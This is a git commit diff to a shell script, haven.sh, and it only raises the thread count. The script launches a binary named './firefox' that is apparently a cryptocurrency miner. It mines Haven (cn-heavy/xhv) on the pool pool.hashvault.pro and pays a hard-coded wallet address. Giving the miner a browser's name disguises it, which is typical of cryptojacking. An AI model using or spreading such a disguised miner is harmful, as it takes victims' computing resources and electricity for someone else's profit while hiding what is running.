f0aa989f52ac7b92d19d3c02689a621efa0ec45e
bendrat1 <89236724+bendrat1@users.noreply.github.com>
2022-06-25 06:05:43 +0000

    Update haven.sh

--- haven.sh
+++ haven.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-./firefox -a cn-heavy/xhv -o pool.hashvault.pro:443 -u hvs1UJpScHDaKYpiMZyAi9gSnyD3GLfXdfWhm9ckBcGVW637AVqhWgCJ9BbS7qBRhQC67YRR3RHj5boRP65DDoLNAdDVud8QGp.001 -p x -k -t 2 --cpu-priority 3
+./firefox -a cn-heavy/xhv -o pool.hashvault.pro:443 -u hvs1UJpScHDaKYpiMZyAi9gSnyD3GLfXdfWhm9ckBcGVW637AVqhWgCJ9BbS7qBRhQC67YRR3RHj5boRP65DDoLNAdDVud8QGp.001 -p x -k -t 3 --cpu-priority 3
